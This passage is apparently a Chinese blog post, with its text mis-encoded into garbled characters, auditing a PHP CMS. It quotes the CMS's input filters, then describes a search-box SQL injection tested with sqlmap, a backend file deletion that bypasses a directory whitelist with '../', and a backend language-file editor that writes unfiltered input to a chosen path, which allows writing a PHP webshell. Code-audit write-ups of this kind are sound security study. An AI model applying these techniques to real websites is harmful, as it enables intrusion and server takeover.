è¿‡æ»¤"></a>XSS è¿‡æ»¤</h2><p>å‰å°å­˜åœ¨ç•™è¨€åŠŸèƒ½ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184533.png" alt="image-20200912103732317"></p><p>æäº¤åï¼Œæˆ‘ä»¬ç™»å½•åå°ç®¡ç†å‘˜è¿›è¡ŒæŸ¥çœ‹ç•™è¨€å†…å®¹ã€‚ å‘ç°å¹¶æ²¡æœ‰æ‰§è¡Œjsä»£ç ã€‚</p><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$mes_email = post(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">$mes_type = post(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">$mes_title = post(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">$mes_text = post(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$mes_show = post(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($mes_email == <span class="string">&#x27;&#x27;</span> || $mes_type == <span class="string">&#x27;&#x27;</span> || $mes_title == <span class="string">&#x27;&#x27;</span> || $mes_text == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$mes_add_time = time();</span><br><span class="line"><span class="keyword">if</span>($mes_show != <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$mes_show = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> message();</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_user_id&#x27;</span>,$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_type&#x27;</span>,$mes_type);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_email&#x27;</span>,$mes_email);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_title&#x27;</span>,$mes_title);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_text&#x27;</span>,$mes_text);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_add_time&#x27;</span>,$mes_add_time);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_show&#x27;</span>,$mes_show);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_lang&#x27;</span>,S_LANG);</span><br><span class="line">$obj-&gt;add();</span><br><span class="line"><span class="keyword">if</span>(intval(get_varia(<span class="string">&#x27;sentmail&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">$email_title = <span class="string">&#x27;æ‚¨çš„ç½‘ç«™æœ‰äº†æ–°çš„ç•™è¨€&#x27;</span>;</span><br><span class="line">$email_text = <span class="string">&quot;[$mes_type] $mes_title &lt;br /&gt; $mes_text&quot;</span>;</span><br><span class="line">call_send_email($email_title,$email_text,$global[<span class="string">&#x27;user_id&#x27;</span>],$mes_email);</span><br><span class="line">&#125;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_message&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;message&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„è¾“å…¥æ˜¯è¢«ä¼ å…¥äº†<code>post</code> å‡½æ•°è¿›è¡Œæ‰§è¡Œï¼Œè·Ÿè¿›è¯¥å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–post</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">$val,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_POST[$val])?$_POST[$val]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡äº†<code>strict</code> æ¡ä»¶çš„è¿‡æ»¤å‡½æ•°ï¼Œæ‰¾åˆ°è¿™ä¸ªçš„å®šä¹‰å¤„ã€‚</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸¥æ ¼è¿‡æ»¤å­—ç¬¦ä¸²ä¸­çš„å±é™©ç¬¦å·</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str);</span><br><span class="line">   &#125;</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;#60;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;#62;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&amp;#63;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&amp;#37;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">39</span>),<span class="string">&#x27;&amp;#39;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">34</span>),<span class="string">&#x27;&amp;#34;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">13</span>).chr(<span class="number">10</span>),<span class="string">&#x27;&lt;br /&gt;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°html çš„é—­åˆæ ‡ç­¾è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥æ²¡æ³•XSS</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_pwd</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;edit_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$old_pwd = post(<span class="string">&#x27;old_pwd&#x27;</span>);</span><br><span class="line">$new_pwd = post(<span class="string">&#x27;new_pwd&#x27;</span>);</span><br><span class="line">$re_pwd = post(<span class="string">&#x27;re_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($old_pwd) &lt; <span class="number">6</span> || strlen($old_pwd) &gt; <span class="number">15</span> || strlen($new_pwd) &lt; <span class="number">6</span> || strlen($new_pwd) &gt; <span class="number">15</span> || $new_pwd != $re_pwd)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$use_password = md5($old_pwd);</span><br><span class="line">$obj = <span class="keyword">new</span> users();</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&quot;use_password = &#x27;$use_password&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($obj-&gt;get_count() &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$use_password = md5($new_pwd);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;use_password&#x27;</span>,$use_password);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;edit();</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;over&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;old_pwd_error&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;entrance&#x27;</span>=&gt;$global[<span class="string">&#x27;entrance&#x27;</span>],<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;profile&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CSRF ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œéœ€è¦æ—§å¯†ç ï¼Œè¡Œä¸é€šã€‚</p><h2 id="å¯æ§å˜é‡è¿‡æ»¤"><a href="#å¯æ§å˜é‡è¿‡æ»¤" class="headerlink" title="å¯æ§å˜é‡è¿‡æ»¤"></a>å¯æ§å˜é‡è¿‡æ»¤</h2><h3 id="session-è¿‡æ»¤"><a href="#session-è¿‡æ»¤" class="headerlink" title="session è¿‡æ»¤"></a>session è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–session</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_session</span>(<span class="params">$name,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_SESSION)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_SESSION[$name])?$_SESSION[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_COOKIE[$name])?$_COOKIE[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cookie-è¿‡æ»¤"><a href="#cookie-è¿‡æ»¤" class="headerlink" title="cookie è¿‡æ»¤"></a>cookie è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params">$name,$value,$filter = <span class="string">&#x27;strict&#x27;</span>,$expire = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($expire == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      setcookie($name,$filter($value));</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      setcookie($name,$filter($value),$expire);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="admin-ç™»å½•"><a href="#admin-ç™»å½•" class="headerlink" title="admin ç™»å½•"></a>admin ç™»å½•</h3><p>admin/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;admin_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $username = substr(post(<span class="string">&#x27;username&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   $password = substr(post(<span class="string">&#x27;password&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> || $password == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_username&#x27;</span>);</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_password&#x27;</span>);</span><br><span class="line">      $info_text = <span class="string">&#x27;å¯¹ä¸èµ·ï¼Œç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º&#x27;</span>;</span><br><span class="line">      $link_text = <span class="string">&#x27;è¿”å›é‡æ–°ç™»å½•&#x27;</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     â€¦â€¦</span><br></pre></td></tr></table></figure><h3 id="user-ç™»å½•"><a href="#user-ç™»å½•" class="headerlink" title="user ç™»å½•"></a>user ç™»å½•</h3><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;user_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">   $info_text = post(<span class="string">&#x27;info_text&#x27;</span>);</span><br><span class="line">   $link_text = post(<span class="string">&#x27;link_text&#x27;</span>);</span><br><span class="line">   $link_href = post(<span class="string">&#x27;link_href&#x27;</span>);</span><br><span class="line">   $username = post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">   $password = post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(strlen($username) &gt; <span class="number">30</span>)&#123;$username = substr($username,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>(strlen($password) &gt; <span class="number">30</span>)&#123;$password = substr($password,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> $password == <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒåŸºæœ¬éƒ½ç»è¿‡äº†å¸¦æœ‰è¿‡æ»¤çš„å‡½æ•°å¤„ç†ã€‚æ‰€ä»¥åƒï¼ŒSQLæ³¨å…¥å’ŒXSS è¿™ç§éœ€è¦æ„é€ ç‰¹æ®Šç¬¦å·çš„æ¼æ´å‡ ä¹å¾ˆéš¾äº†</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>åŸºäºåŠŸèƒ½ç‚¹å»æµ‹ï¼Œå…ˆé«˜å±åä½å±ã€‚åå°ä¸€èˆ¬é˜²å¾¡è¾ƒå¼±ï¼Œä»åå°çªç ´è¾ƒå®¹æ˜“ã€‚è€Œåå°å­˜åœ¨çš„åŠŸèƒ½æœ‰ï¼šå›¾ç‰‡ã€æ–‡ä»¶ã€æ¨¡æ¿ç®¡ç†ã€åˆ é™¤ã€ç•™è¨€å®¡æ ¸ï¼Œç­‰å…¶ä»–åŠŸèƒ½ã€‚</p><h2 id="å‰å°æœç´¢æ¡†SQL-æ³¨å…¥"><a href="#å‰å°æœç´¢æ¡†SQL-æ³¨å…¥" class="headerlink" title="å‰å°æœç´¢æ¡†SQL æ³¨å…¥"></a>å‰å°æœç´¢æ¡†SQL æ³¨å…¥</h2><p>å¼€å¯MySQL ç›‘æ§ï¼Œç„¶åå†æœç´¢æ¡†è¿›è¡Œæœç´¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184500.png" alt="image-20200912161945551"></p><p>å¦‚å›¾ï¼Œ123ï¼Œè¢«å¸¦å…¥SQLè¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼Œå•å¼•å·é—­åˆã€‚å°†å…³é”®å­—åœ¨æ•´ä¸ªæ–‡ä»¶å¤¹ä¸­æœç´¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184441.png" alt="image-20200912162117271"></p><p>è¿™é‡Œå…ˆrawurldecode è§£ç ï¼Œç„¶åå¸¦å…¥æ‹¼æ¥è¿›å…¥æŸ¥è¯¢ã€‚</p><p>ç„¶åä¸‹æ–­ç‚¹è¿›è¡Œåˆ†æï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184427.png" alt="image-20200912165411168"></p><p>ç›´æ¥ä¸Šsqlmapã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184409.png" alt="image-20200912155851842"></p><h2 id="åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"><a href="#åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´" class="headerlink" title="åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"></a>åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</h2><p><strong>/admin/deal.php</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184208.png" alt="image-20200912144227587"></p><p>æ­¤å¤„é‡‡ç”¨äº†ç™½åå•çš„å½¢å¼ï¼Œåªèƒ½åˆ é™¤ æŒ‡å®šçš„ä¸‰ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ä½†æ˜¯å¿½ç•¥äº†å¯ä»¥ç”¨<code>../</code>æ¥ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($path,<span class="number">0</span>,strlen($dir[$i])) == $dir[$i])</span><br><span class="line">&#123;</span><br><span class="line">   $flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>substr ä»ç¬¬<code>$path</code>çš„ç¬¬ä¸€ä¸ªå­—æ¯å¼€å§‹å¾€ååˆ¤æ–­ï¼Œæˆªå–pathå‰åŠéƒ¨åˆ†é•¿åº¦å’Œç™½åå•æ˜¯å¦ç›¸ç­‰ï¼Œå³æ˜¯å¦æ˜¯ç™½åå•é‡Œçš„é‚£å‡ ä¸ªç›®å½•ï¼Œæ˜¯ï¼Œç„¶å<code>unlink</code>åˆ é™¤æ‰ã€‚</p><p>æˆåŠŸåˆ é™¤æ–‡ä»¶æ—¶ï¼Œè¿”å›1ã€‚</p><p>è¿™é‡Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿™ä¸ªåŸŸåæ˜¯é€šè¿‡MAMPä¿®æ”¹çš„æœ¬åœ°HOSTSæ–‡ä»¶è§£æçš„ï¼Œç„¶åæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œ<a href="https://www.jianshu.com/p/3018b2697bb0%EF%BC%8C%E7%AE%80%E5%8D%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82">https://www.jianshu.com/p/3018b2697bb0ï¼Œç®€å•è®¾ç½®ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184157.png" alt="image-20200912152353172"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184144.png" alt="image-20200912152108244"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184031.gif" alt="æ¼æ´æ¼”ç¤º"></p><h2 id="åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell"><a href="#åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell" class="headerlink" title="åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell"></a>åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell</h2><p>æˆåŠŸç¼–è¾‘åï¼Œå›æ˜¾ ç¼–è¾‘è¯­è¨€åŒ…æˆåŠŸã€‚é‚£ä¹ˆåœ¨æ•´ä¸ªæ–‡ä»¶ä¸­æœç´¢å³å¯å®šä½åˆ°ä»£ç ã€‚<br>**/admin/module/file/deal.php**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_lang</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">   $lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">   file_put_contents($path,$lang_text);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,<span class="string">&#x27;ç¼–è¾‘è¯­è¨€åŒ…æˆåŠŸ&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,<span class="string">&#x27;è¿”å›ä¸Šä¸€é¡µ&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;lang_edit&#x27;</span>,<span class="string">&#x27;path&#x27;</span>=&gt;rawurlencode($path))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥å‡½æ•°ä¸­ï¼Œç»è¿‡<code>post()</code> å‡½æ•°è¿‡æ»¤ï¼Œä½†æ˜¯å¯¹äº<code>$lang_text</code> çš„è¿‡æ»¤è§„åˆ™æ˜¯<code>no_filter</code> ï¼Œè·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹è¯¥è§„åˆ™ã€‚</p><p>/include/function.php,104è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸è¿‡æ»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str); <span class="comment">// åˆ é™¤åæ–œæ </span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤ <code>$lang_text</code> å°±é€šè¿‡<code>file_put_contents</code> å†™å…¥æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å†™WebShellã€‚</p><p>åŒæ ·çš„ï¼Œä¸‹æ–­ç‚¹æ¥è°ƒè¯•åˆ†æã€‚</p><p>step into ï¼Œæ…¢æ…¢ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå†™å…¥webshell</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184010.png" alt="image-20200912173700069"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183848.png" alt="image-20200912173822681"></p><p><code>$path</code> å¯æ§çš„ï¼Œè¿™é‡Œåªéœ€è¦æŠŠ<code>$path</code> æ”¹ä¸ºä¸€ä¸ª<code>.php</code> åç¼€çš„å°±å¯ä»¥GetShell äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183833.png" alt="image-20200912174519203"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183821.png" alt="image-20200912174743837"></p><h1 id="å®¡è®¡æ€»ç»“"><a href="#å®¡è®¡æ€»ç»“" class="headerlink" title="å®¡è®¡æ€»ç»“"></a>å®¡è®¡æ€»ç»“</h1><p>åŸºæœ¬ä¸Šæ˜¯ç…§æ¬ç…§æŠ„åˆ«äººçš„æ€è·¯æ¥æçš„ï¼Œæ€»æ¯”èººç€ç©æ‰‹æœºå¼ºï¼Œä¹Ÿé‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚Burp Suite è®¾ç½® åŸŸåå’Œip ç»‘å®šï¼Œphpstorm 